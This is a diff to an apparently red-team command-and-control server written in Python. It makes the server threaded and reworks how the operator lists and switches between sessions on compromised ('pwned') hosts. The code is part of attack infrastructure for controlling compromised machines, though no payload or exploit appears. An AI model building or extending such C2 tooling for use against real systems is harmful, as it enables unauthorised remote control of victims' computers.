@@ -2,7 +2,7 @@
 """
 C2 Server side code
 """
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import unquote_plus
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
@@ -15,25 +15,30 @@ def get_new_session():
     allow the red teamer to pick one to become a new active session. """
     global active_session, pwned_dict, pwned_id, cwd
 
-    del pwned_dict[active_session]
-
     cwd = "~"
     # if dict empty, re-init vars to their starting val
-    if not pwned_dict:
+    if len(pwned_dict) == 1:
         print("Waiting for new connection")
+        pwned_dict = {}
         pwned_id = 0
         active_session = 1
     else:
         while True:
             # display sessions in dict to switch a new active one.
-            print(*pwned_dict.items(), sep="\n")
+            # print(*pwned_dict.items(), sep="\n")
+            for key, value in pwned_dict.items():
+                if key != active_session:
+                    print(key, "-", value)
             try:
                 new_session = int(input("\nChoose a session nbr to make active: "))
             except ValueError:
                 print("\nYou must choose a pwnd id in one the session shown on screen.\n")
                 continue
-            if new_session in  pwned_dict:
+
+            if new_session in  pwned_dict and new_session != active_session:
+                old_active_session = active_session
                 active_session = new_session
+                del pwned_dict[old_active_session]
                 print(f"\nActive session is now: {pwned_dict[active_session]}")
                 break
             else:
@@ -163,7 +168,7 @@ if not path.isdir(STORAGE):
 print("server version:", C2Handler.server_version)
 print("sys_version:", C2Handler.sys_version)
 
-server = HTTPServer((BIND_ADDR, PORT), C2Handler)
+server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)
 server.serve_forever()
 # def run(server_class=HTTPServer, handler_class=BHTTPR):
 #     server_address = ('', 8900)
